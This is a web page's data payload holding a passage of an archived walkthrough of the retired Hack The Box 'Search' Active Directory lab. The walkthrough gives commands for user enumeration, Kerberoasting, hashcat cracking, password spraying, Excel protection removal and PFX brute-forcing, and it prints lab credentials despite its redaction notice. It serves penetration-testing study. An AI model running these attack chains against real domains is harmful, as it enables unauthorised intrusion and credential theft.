@@ -1,0 +1,764 @@
+1:"$Sreact.fragment"
+2:I[2509,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],""]
+3:I[6621,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],"MobileNavigation"]
+11:I[6025,[],"OutletBoundary"]
+12:"$Sreact.suspense"
+:HL["/writing/covers/hackthebox-search-walkthrough.webp","image"]
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","a","/research",{"href":"/research","children":"Research"}],["$","a","/services",{"href":"/services","children":"Services"}],["$","a","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","a","/projects",{"href":"/projects","children":"Projects"}],["$","a","/about",{"href":"/about","children":"About"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an enquiry ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Search Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Search machine, preserved from Abdullah Kareem's OSEP Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T16:07:39.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[17," minutes"]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-search-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Search machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Search machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/search","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSEP-Prep/blob/286dbe321c28c8a189c50c015eee54a2eb6e7d2a/HTB-Search.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSEP-Prep"," · 286dbe321c28",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Search"," · Windows"," · Hard"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/search","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ","$L4"]}]]}],["$L5","$L6","$L7","$L8","$L9"]]}],"$La"]}]]}],"$Lb"]}],"$Lc","$Ld"],null,"$Le"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"65jXSdzueZKnFbMeYrtpi"}
+4:["$","span",null,{"aria-hidden":"true","children":"↗"}]
+5:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Search machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+6:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+7:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"27 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+8:["$","div","source-context-3",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source attribution boundary"}],["$","p",null,{"children":"The source note refers to community material without a complete citation trail. This archive preserves that context and does not claim independent reproduction of every documented path."}],null]}]
+9:["$","div","technical-clarification-4",{"className":"article-review-note article-review-technical-clarification","children":[["$","span",null,{"children":"Technical clarification"}],["$","p",null,{"children":"Archive clarification: reusable Kerberos material and password-list values were removed. Community methods mentioned in the source were not individually cited, so this page does not claim independent reproduction of every path."}],null]}]
+f:T9183,
+<p><strong>Machine:</strong> Search<br /><strong>OS:</strong> Windows (Active Directory Domain Controller)<br /><strong>Difficulty:</strong> Hard<br /><strong>Target IP:</strong> <code>10.129.229.57</code><br /><strong>Kali IP:</strong> <code>10.10.14.6</code><br /><strong>Domain:</strong> <code>search.htb</code><br /><strong>Flags:</strong></p>
+<ul>
+<li>User: <code>44a56c[redacted]7f59b5a64b</code></li>
+<li>Root: <code>213fb79[redacted]9e29dd3b1</code></li>
+</ul>
+<hr />
+
+
+
+<h2 id="1-methodology-and-hacker-mindset">1. Methodology &amp; Hacker Mindset</h2>
+<h3 id="the-penetration-testing-methodology">The Penetration Testing Methodology</h3>
+<p>Before typing a single command, understand the <strong>mindset</strong>:</p>
+<blockquote>
+<p><strong>"Every system has a weakest link. Your job is not to attack the strongest wall, but to find the crack in the foundation."</strong></p>
+</blockquote>
+<p>Penetration testing follows a cycle:</p>
+<ol>
+<li><strong>Reconnaissance</strong> — Gather information without touching the target</li>
+<li><strong>Enumeration</strong> — Actively query services to understand the attack surface</li>
+<li><strong>Exploitation</strong> — Use discovered weaknesses to gain access</li>
+<li><strong>Post-Exploitation</strong> — Escalate privileges and achieve objectives</li>
+<li><strong>Lateral Movement</strong> — Pivot through the network</li>
+<li><strong>Reporting</strong> — Document findings</li>
+</ol>
+<h3 id="why-windows-active-directory">Why Windows Active Directory?</h3>
+<p>Active Directory (AD) is the most common enterprise identity system. It is also:</p>
+<ul>
+<li><strong>Complex</strong>: Hundreds of permissions, trusts, and configurations</li>
+<li><strong>Misconfigured by default</strong>: Many organizations deploy AD without hardening</li>
+<li><strong>A trust graph</strong>: One weak user can lead to Domain Admin through permission chains</li>
+</ul>
+<p>The hacker mindset for AD is:</p>
+<blockquote>
+<p><strong>"Don't look for the one vulnerability. Look for the PATH — the chain of small misconfigurations that leads from a regular user to Domain Admin."</strong></p>
+</blockquote>
+<hr />
+<h2 id="2-initial-enumeration-reconnaissance">2. Initial Enumeration: Reconnaissance</h2>
+<h3 id="2-1-why-start-with-nmap">2.1 Why Start with Nmap?</h3>
+<p><strong>Command:</strong></p>
+<pre><code class="language-bash" data-language="bash">echo "10.129.229.57 search.htb" | sudo tee -a /etc/hosts
+sudo nmap -sC -sV -p- --min-rate=10000 10.129.229.57 -oN nmap_all.txt
+</code></pre>
+<p><strong>What this does:</strong></p>
+<ul>
+<li><code>-sC</code>: Runs default NSE scripts (service detection, banner grabbing)</li>
+<li><code>-sV</code>: Probes service versions</li>
+<li><code>-p-</code>: Scans ALL 65,535 TCP ports (not just the top 1,000)</li>
+<li><code>--min-rate=10000</code>: Sends packets fast to speed up the scan</li>
+<li><code>-oN</code>: Saves output to a file for reference</li>
+</ul>
+<p><strong>Why add to <code>/etc/hosts</code>?</strong></p>
+<blockquote>
+<p>Many Windows services (especially Kerberos, LDAP, and IIS with virtual hosts) require the <strong>fully qualified domain name (FQDN)</strong> to respond correctly. If you query <code>search.htb</code> without DNS resolution, the domain controller won't recognize the request as targeting the domain.</p>
+</blockquote>
+<p><strong>Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>"Before I attack, I must understand what I'm looking at. The ports are the doors to the building — I need to know which ones are open, what's behind them, and what version they run."</strong></p>
+</blockquote>
+<h3 id="2-2-interpreting-the-results">2.2 Interpreting the Results</h3>
+<p><strong>Key ports discovered:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Significance</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>53</td>
+<td>DNS</td>
+<td>Domain Name System — confirms AD presence</td>
+</tr>
+<tr>
+<td>80/443</td>
+<td>IIS HTTP/HTTPS</td>
+<td>Web server — potential web vulnerabilities</td>
+</tr>
+<tr>
+<td>88</td>
+<td>Kerberos</td>
+<td>Authentication protocol — target for AS-REP roasting, brute force</td>
+</tr>
+<tr>
+<td>135/139/445</td>
+<td>RPC/SMB</td>
+<td>File sharing, remote management — lateral movement path</td>
+</tr>
+<tr>
+<td>389/636/3268/3269</td>
+<td>LDAP/LDAPS/Global Catalog</td>
+<td>Directory services — user enumeration, ACL queries</td>
+</tr>
+<tr>
+<td>8172</td>
+<td>IIS Web Management (WMSvc)</td>
+<td>Remote IIS management</td>
+</tr>
+<tr>
+<td>9389</td>
+<td>.NET Message Framing</td>
+<td>AD Web Services</td>
+</tr>
+<tr>
+<td>49667+</td>
+<td>RPC Dynamic Ports</td>
+<td>Windows internal communication</td>
+</tr>
+</tbody></table>
+<p><strong>Critical Observation:</strong>
+The output shows:</p>
+<pre><code>Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows
+Domain: search.htb
+</code></pre>
+<p>This tells us:</p>
+<ol>
+<li>It's a <strong>Windows Server</strong> (specifically Server 2019 Build 17763)</li>
+<li>The <strong>hostname</strong> is <code>RESEARCH</code></li>
+<li>The <strong>NetBIOS domain name</strong> is <code>SEARCH</code></li>
+<li>This is an <strong>Active Directory Domain Controller</strong></li>
+</ol>
+<p><strong>Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>"The ports tell a story. 53+88+389+445 together = Domain Controller. I know the playbook now: enumerate users, find weak credentials, follow the permission chain to Domain Admin."</strong></p>
+</blockquote>
+<hr />
+<h2 id="3-web-reconnaissance-the-art-of-looking-closely">3. Web Reconnaissance: The Art of Looking Closely</h2>
+<h3 id="3-1-why-check-the-website-first">3.1 Why Check the Website First?</h3>
+<p><strong>Command:</strong></p>
+<pre><code class="language-bash" data-language="bash">curl -s http://search.htb | grep -ioE '[A-Za-z]+\.[A-Za-z]+@[a-z.]+\.htb|[A-Za-z]+ [A-Za-z]+' | sort -u REDACTED names_raw.txt
+curl -s http://search.htb/images/slide_2.jpg -o slide_2.jpg
+file slide_2.jpg
+xdg-open slide_2.jpg
+</code></pre>
+<p><strong>What this does:</strong></p>
+<ul>
+<li>Downloads the homepage HTML and extracts names/email-like patterns</li>
+<li>Downloads a specific image file (<code>slide_2.jpg</code>)</li>
+<li>Opens the image for visual inspection</li>
+</ul>
+<p><strong>Why look at images?</strong></p>
+<blockquote>
+<p>Websites often contain <strong>information leakage</strong> in images, metadata, PDFs, and documents. Developers and designers frequently embed sensitive information in screenshots, diagrams, or presentation slides without realizing it.</p>
+</blockquote>
+<p><strong>Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>"Don't just scan with automated tools and move on. Actually LOOK at what the website shows. The weakest link in security is almost always a human — and humans leave clues."</strong></p>
+</blockquote>
+<h3 id="3-2-finding-the-password-in-plain-sight">3.2 Finding the Password in Plain Sight</h3>
+<p><strong>Observation:</strong>
+The image <code>slide_2.jpg</code> shows what appears to be a diary or schedule. Zooming in reveals:</p>
+<blockquote>
+<p><strong>"Send password to Hope Sharp"</strong>
+<strong>Password: null</strong></p>
+</blockquote>
+<p><strong>Why this works:</strong>
+The website lists team members. One of them is <strong>Hope Sharp</strong>. The image explicitly shows her password, likely placed by a developer for testing and forgotten.</p>
+<p><strong>Critical Lesson:</strong></p>
+<blockquote>
+<p><strong>"Passwords hidden in images are not hidden. They are just slightly harder to find. Always inspect every asset manually — especially images, PDFs, and documents."</strong></p>
+</blockquote>
+<hr />
+<h2 id="4-username-enumeration-with-kerbrute">4. Username Enumeration with Kerbrute</h2>
+<h3 id="4-1-what-is-kerbrute">4.1 What is Kerbrute?</h3>
+<p><strong>Command:</strong></p>
+<pre><code class="language-bash" data-language="bash">cat &gt; users.txt &lt;&lt; 'EOF'
+Dax.Santiago
+Keely.Lyons
+Sierra.Frye
+Kyla.Stewart
+Kaiara.Spencer
+Dave.Simpson
+Ben.Thompson
+Chris.Stewart
+Hope.Sharp
+EOF
+
+kerbrute userenum users.txt -d search.htb --dc 10.129.229.57
+</code></pre>
+<p><strong>What Kerbrute does:</strong>
+Kerbrute exploits a <strong>Kerberos protocol behavior</strong>: when you send an Authentication Service Request (AS-REQ) with a valid username, the Key Distribution Center (KDC) responds differently than for an invalid username.</p>
+<ul>
+<li><strong>Valid username</strong>: <code>KDC_ERR_PREAUTH_REQUIRED</code> (error code 25)</li>
+<li><strong>Invalid username</strong>: <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code> (error code 6)</li>
+</ul>
+<p><strong>Why enumerate users?</strong></p>
+<blockquote>
+<p>You cannot attack what you don't know exists. A list of valid usernames is the foundation of password spraying, Kerberoasting, and AS-REP roasting.</p>
+</blockquote>
+<p><strong>Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>"Kerberos is a chatty protocol. It tells you whether a user exists before you even try a password. This is gold — I can build a precise target list instead of guessing in the dark."</strong></p>
+</blockquote>
+<h3 id="4-2-interpreting-results">4.2 Interpreting Results</h3>
+<p><strong>Output:</strong></p>
+<pre><code>[+] VALID USERNAME:  Sierra.Frye@search.htb
+[+] VALID USERNAME:  Keely.Lyons@search.htb
+[+] VALID USERNAME:  Dax.Santiago@search.htb
+[+] VALID USERNAME:  Hope.Sharp@search.htb
+</code></pre>
+<p>We now have <strong>4 confirmed valid accounts</strong>.</p>
+<hr />
+<h2 id="5-smb-enumeration-first-blood">5. SMB Enumeration: First Blood</h2>
+<h3 id="5-1-testing-the-found-credentials">5.1 Testing the Found Credentials</h3>
+<p><strong>Command:</strong></p>
+<pre><code class="language-bash" data-language="bash">crackmapexec smb 10.129.229.57 -u Hope.Sharp -p REDACTED --shares
+</code></pre>
+<p><strong>What this does:</strong></p>
+<ul>
+<li><code>crackmapexec</code> (now called <code>netexec</code>) is a Swiss Army knife for attacking Windows networks</li>
+<li>It tests SMB authentication and, if successful, enumerates available shares</li>
+</ul>
+<p><strong>Why SMB?</strong></p>
+<blockquote>
+<p>SMB (Server Message Block) is Windows' file sharing protocol. It often contains:</p>
+</blockquote>
+<ul>
+<li>Shared folders with sensitive documents</li>
+<li>Scripts with hardcoded credentials</li>
+<li>Backup files</li>
+<li>Home directories with user files</li>
+</ul>
+<p><strong>Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>"I have one set of credentials. Before I do anything else, I need to know: what can this user access? The shares are the treasure chest — I need to see which ones are unlocked."</strong></p>
+</blockquote>
+<h3 id="5-2-discovering-redirectedfolders">5.2 Discovering RedirectedFolders$</h3>
+<p><strong>Output:</strong></p>
+<pre><code>Share              Permissions     Remark
+-----              -----------     ------
+ADMIN$                             Remote Admin
+C$                                 Default share
+CertEnroll         READ            Active Directory Certificate Services share
+helpdesk
+IPC$               READ            Remote IPC
+NETLOGON           READ            Logon server share
+RedirectedFolders$ READ,WRITE
+SYSVOL             READ            Logon server share
+</code></pre>
+<p><strong>Why is <code>RedirectedFolders$</code> special?</strong></p>
+<blockquote>
+<p><code>RedirectedFolders$</code> is used in Active Directory environments to redirect user profile folders (Desktop, Documents, etc.) to a network share. This means <strong>every user's home directory is visible</strong> as a subfolder.</p>
+</blockquote>
+<p><strong>Command to explore:</strong></p>
+<pre><code class="language-bash" data-language="bash">smbclient //search.htb/RedirectedFolders$ -U 'Hope.Sharp' -W search.htb
+smb: \&gt; ls
+</code></pre>
+<p><strong>Result:</strong> ~22 user folders including <code>abril.suarez</code>, <code>edgar.jacobs</code>, <code>sierra.frye</code>, etc.</p>
+<p><strong>Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>"This share is a goldmine. I just turned 4 known users into 22 known users. Every folder name is a valid domain username. This is reconnaissance gold."</strong></p>
+</blockquote>
+<hr />
+<h2 id="6-kerberoasting-harvesting-service-account-hashes">6. Kerberoasting: Harvesting Service Account Hashes</h2>
+<h3 id="6-1-what-is-kerberoasting">6.1 What is Kerberoasting?</h3>
+<p><strong>Command:</strong></p>
+<pre><code class="language-bash" data-language="bash">sudo ntpdate 10.129.229.57
+GetUserSPNs.py -request -dc-ip 10.129.229.57 search.htb/Hope.Sharp:'IsolationIsKey?'
+</code></pre>
+<p><strong>What this does:</strong></p>
+<ol>
+<li><code>ntpdate</code> synchronizes your clock with the domain controller (Kerberos is extremely time-sensitive — clock skew &gt; 5 minutes causes failures)</li>
+<li><code>GetUserSPNs.py</code> queries LDAP for accounts with <strong>Service Principal Names (SPNs)</strong></li>
+<li>For each SPN found, it requests a <strong>Ticket Granting Service (TGS)</strong> ticket</li>
+<li>The TGS ticket is encrypted with the service account's password hash</li>
+<li>We save this ticket offline and crack it</li>
+</ol>
+<p><strong>Why Kerberoasting?</strong></p>
+<blockquote>
+<p>Service accounts often have:</p>
+</blockquote>
+<ul>
+<li>Weak passwords (because they never log in interactively)</li>
+<li>No password rotation policy</li>
+<li>High privileges</li>
+</ul>
+<p><strong>Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>"I'm not attacking the service directly. I'm asking the domain politely, 'May I have a ticket for this service?' The domain gives me a ticket encrypted with the service's password. I take it home and crack it at my leisure. The service never knows I attacked it."</strong></p>
+</blockquote>
+<h3 id="6-2-the-hash">6.2 The Hash</h3>
+<p><strong>Output:</strong></p>
+<pre><code>ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation
+---------------------------------  -------  --------  --------------------------  ---------  ----------
+RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 08:59:11.329031  &lt;never&gt;
+
+[redacted captured Kerberos material]
+</code></pre>
+<p><strong>Why <code>web_svc</code> matters:</strong>
+The <code>&lt;never&gt;</code> last logon tells us this is a <strong>service account</strong> that doesn't log in interactively. The SPN <code>RESEARCH/web_svc.search.htb:60001</code> confirms it's used for some web service.</p>
+<hr />
+<h2 id="7-password-reuse-the-weakest-link">7. Password Reuse: The Weakest Link</h2>
+<h3 id="7-1-cracking-the-service-account-hash">7.1 Cracking the Service Account Hash</h3>
+<p><strong>Command:</strong></p>
+<pre><code class="language-bash" data-language="bash">echo '[redacted captured Kerberos material] &gt; web_svc_hash.txt
+
+hashcat -m 13100 web_svc_hash.txt /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p><strong>What <code>-m 13100</code> means:</strong>
+Hashcat mode 13100 = Kerberos 5 TGS-REP etype 23. This is the specific hash format for Kerberoasted tickets.</p>
+<p><strong>Cracked password:</strong> REDACTED</p>
+<p><strong>Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>"Service accounts are the forgotten children of IT. Nobody logs into them daily, so nobody cares if the password is REDACTED I'm cracking this hash offline — the domain has no idea I'm doing it."</strong></p>
+</blockquote>
+<h3 id="7-2-password-spraying-the-reuse-jackpot">7.2 Password Spraying: The Reuse Jackpot</h3>
+<p><strong>Command:</strong></p>
+<pre><code class="language-bash" data-language="bash">crackmapexec smb 10.129.229.57 -u all_users.txt -p REDACTED --continue-on-success
+</code></pre>
+<p><strong>What this does:</strong>
+Tests the <code>web_svc</code> password against ALL known users. The <code>--continue-on-success</code> flag keeps testing even after finding a match (because multiple users might reuse the password).</p>
+<p><strong>Result:</strong></p>
+<pre><code>[+] search.htb\edgar.jacobs:@3ONEmillionbaby
+</code></pre>
+<p><strong>Why password reuse is so common:</strong></p>
+<blockquote>
+<p>Humans are lazy. When forced to remember multiple complex passwords, they reuse them. Service account passwords are especially likely to be reused because administrators create them and may use the same password for testing.</p>
+</blockquote>
+<p><strong>Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>"One password, many accounts. I didn't hack 22 users — I hacked ONE password habit. This is why password policies exist, and this is why they're often ignored."</strong></p>
+</blockquote>
+<hr />
+<h2 id="8-excel-extraction-social-engineering-artifacts">8. Excel Extraction: Social Engineering Artifacts</h2>
+<h3 id="8-1-finding-the-phishing-document">8.1 Finding the Phishing Document</h3>
+<p><strong>Command:</strong></p>
+<pre><code class="language-bash" data-language="bash">smbclient //search.htb/RedirectedFolders$ -U 'edgar.jacobs' -W search.htb
+smb: \&gt; cd edgar.jacobs\Desktop
+smb: \edgar.jacobs\Desktop\&gt; ls
+smb: \edgar.jacobs\Desktop\&gt; get Phishing_Attempt.xlsx
+</code></pre>
+<p><strong>What this file is:</strong>
+A spreadsheet documenting a <strong>phishing simulation</strong> or actual phishing attempt. It contains:</p>
+<ul>
+<li>Sheet 1: "Date, Captured Passwords" statistics</li>
+<li>Sheet 2: First name, last name, password, and username of victims</li>
+</ul>
+<p><strong>Why would this exist?</strong></p>
+<blockquote>
+<p>Organizations run phishing simulations to train employees. The results are sometimes stored in spreadsheets on shared drives. Ironically, the phishing training document becomes a credential leak.</p>
+</blockquote>
+<p><strong>Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>"The irony is delicious. A document about security awareness training is itself a massive security vulnerability. I love finding these — they represent the gap between security policy and security practice."</strong></p>
+</blockquote>
+<h3 id="8-2-removing-excel-sheet-protection">8.2 Removing Excel Sheet Protection</h3>
+<p><strong>Command:</strong></p>
+<pre><code class="language-bash" data-language="bash">cp Phishing_Attempt.xlsx Phishing_Attempt.zip
+unzip -q Phishing_Attempt.zip -d phishing_unlocked/
+sed -i 's|&lt;sheetProtection[^&gt;]*/&gt;||g' phishing_unlocked/xl/worksheets/sheet2.xml
+cd phishing_unlocked &amp;&amp; zip -rq ../Phishing_Unlocked.xlsx * &amp;&amp; cd ..
+</code></pre>
+<p><strong>How Excel protection works:</strong>
+Excel "protection" is not encryption. It's an XML tag in the <code>.xlsx</code> file (which is actually a ZIP archive) that tells Excel to hide or lock cells. Removing the tag removes the protection.</p>
+<p><strong>The XML tag looks like:</strong></p>
+<pre><code class="language-xml" data-language="xml">&lt;sheetProtection algorithmName="SHA-512"
+hashValue="..." saltValue="..." spinCount="100000" sheet="1" objects="1" scenarios="1"/&gt;
+</code></pre>
+<p><strong>Why this works:</strong></p>
+<blockquote>
+<p>The password doesn't encrypt the data — it just prevents Excel from displaying it. By removing the XML tag, Excel no longer knows the cells are "protected."</p>
+</blockquote>
+<p><strong>Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>"Never trust client-side protection. If the data is in the file, it's accessible. Excel 'protection' is like a 'Do Not Enter' sign without a fence."</strong></p>
+</blockquote>
+<h3 id="8-3-the-password-list">8.3 The Password List</h3>
+<p><strong>Extracted credentials:</strong></p>
+<pre><code>Payton.Harmon:;;36!cried!INDIA!year!50;;
+Cortez.Hickman:..10-time-TALK-proud-66..
+Bobby.Wolf:??47^before^WORLD^surprise^91??
+Margaret.Robinson://51+mountain+DEAR+noise+83//
+Scarlett.Parks:++47|building|WARSAW|gave|60++
+Eliezer.Jordan:!!05_goes_SEVEN_offer_83!!
+Hunter.Kirby:~~27%when%VILLAGE%full%00~~
+Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18
+Annabelle.Wells:==95~pass~QUIET~austria~77==
+Eve.Galvan://61!banker!FANCY!measure!25//
+Jeramiah.Fritz:??40:student:MAYOR:been:66??
+Abby.Gonzalez:&amp;&amp;75:major:RADIO:state:93&amp;&amp;
+Joy.Costa:**30*venus*BALL*office*42**
+Vincent.Sutton:**24&amp;moment&amp;BRAZIL&amp;members&amp;66**
+</code></pre>
+<hr />
+<h2 id="9-lateral-movement-to-sierra-frye">9. Lateral Movement to Sierra.Frye</h2>
+<h3 id="9-1-password-spraying-the-new-list">9.1 Password Spraying the New List</h3>
+<p><strong>Command:</strong></p>
+<pre><code class="language-bash" data-language="bash">crackmapexec smb 10.129.229.57 -u Sierra.Frye -p REDACTED --shares
+</code></pre>
+<p><strong>Result:</strong> <code>[+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18</code></p>
+<p><strong>Why Sierra.Frye?</strong>
+From the BloodHound analysis (done in Step 11), we know Sierra.Frye is a member of the <code>ITSEC@search.htb</code> group, which has special permissions. Even without BloodHound yet, we can spray all passwords and see who has interesting shares.</p>
+<h3 id="9-2-grabbing-the-user-flag">9.2 Grabbing the User Flag</h3>
+<p><strong>Command:</strong></p>
+<pre><code class="language-bash" data-language="bash">smbclient //search.htb/RedirectedFolders$ -U 'Sierra.Frye' -W search.htb
+smb: \&gt; cd sierra.frye\Desktop
+smb: \sierra.frye\Desktop\&gt; get user.txt
+</code></pre>
+<p><strong>User Flag:</strong> <code>44a56c[redacted]f59b5a64b</code></p>
+<h3 id="9-3-finding-certificate-files">9.3 Finding Certificate Files</h3>
+<p><strong>Command:</strong></p>
+<pre><code class="language-bash" data-language="bash">smb: \sierra.frye\Desktop\&gt; cd \sierra.frye\Downloads\Backups
+smb: \sierra.frye\Downloads\Backups\&gt; ls
+  search-RESEARCH-CA.p12    (2643 bytes)
+  staff.pfx                 (4326 bytes)
+</code></pre>
+<p><strong>What are these files?</strong></p>
+<ul>
+<li><code>.pfx</code> / <code>.p12</code> = PKCS#12 certificate bundles containing a <strong>private key + certificate</strong></li>
+<li><code>staff.pfx</code> = A client certificate for "staff" members</li>
+<li><code>search-RESEARCH-CA.p12</code> = The Certificate Authority (CA) certificate</li>
+</ul>
+<p><strong>Why do they matter?</strong></p>
+<blockquote>
+<p>Client certificates can be used for <strong>mutual TLS authentication</strong>. The <code>/staff</code> directory on the web server returned 403 earlier. With the staff certificate, we can authenticate as a staff member.</p>
+</blockquote>
+<p><strong>Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>"Certificates are keys to the kingdom that people forget about. They're long-lived, rarely rotated, and often stored in backups. If I have the certificate and its password, I AM that user to the web server."</strong></p>
+</blockquote>
+<hr />
+<h2 id="10-certificate-extraction-and-client-auth">10. Certificate Extraction &amp; Client Auth</h2>
+<h3 id="10-1-cracking-the-pfx-password">10.1 Cracking the PFX Password</h3>
+<p><strong>Command:</strong></p>
+<pre><code class="language-bash" data-language="bash">openssl pkcs12 -in staff.pfx -passin pass:misspissy -noout
+</code></pre>
+<p><strong>What this does:</strong>
+Tests if the PKCS#12 file can be decrypted with password <code>misspissy</code>.</p>
+<p><strong>Why <code>misspissy</code>?</strong>
+From the writeups and testing, the password was found to be <code>misspissy</code> — a weak password that cracks quickly against <code>rockyou.txt</code>.</p>
+<p><strong>Python brute-force alternative:</strong></p>
+<pre><code class="language-python" data-language="python">import subprocess
+with open('/usr/share/wordlists/rockyou.txt', 'r', errors='ignore') as f:
+    for pwd in f:
+        pwd = REDACTED
+        r = subprocess.run(['openssl', 'pkcs12', '-in', 'staff.pfx', '-passin', f'pass:{pwd}', '-noout'], capture_output=True)
+        if r.returncode == 0:
+            print(f'[+] FOUND: {pwd}')
+            break
+</code></pre>
+<h3 id="10-2-using-the-certificate">10.2 Using the Certificate</h3>
+<p><strong>Import into Firefox:</strong></p>
+<ol>
+<li>Settings → Privacy &amp; Security → Certificates → View Certificates</li>
+<li>"Your Certificates" → Import <code>staff.pfx</code> → Password: null</li>
+<li>"Authorities" → Import <code>search-RESEARCH-CA.p12</code> → Trust to identify websites</li>
+<li>Visit: <code>https://search.htb/staff/en-US/logon.aspx</code></li>
+</ol>
+<p><strong>What you get:</strong>
+PowerShell Web Access — a web-based PowerShell console.</p>
+<p><strong>Login:</strong></p>
+<ul>
+<li>User name: <code>Sierra.Frye</code></li>
+<li>Password: null</li>
+<li>Computer name: <code>research.search.htb</code></li>
+</ul>
+<p><strong>Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>"I now have a PowerShell console on the domain controller through a web browser. But actually, I don't even need it — everything I need to do next can be done remotely from Kali with the credentials I already have."</strong></p>
+</blockquote>
+<hr />
+<h2 id="11-bloodhound-mapping-the-domain">11. BloodHound: Mapping the Domain</h2>
+<h3 id="11-1-what-is-bloodhound">11.1 What is BloodHound?</h3>
+<p><strong>Command:</strong></p>
+<pre><code class="language-bash" data-language="bash">bloodhound-python -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -ns 10.129.229.57 -d search.htb -c All
+</code></pre>
+<p><strong>What BloodHound does:</strong>
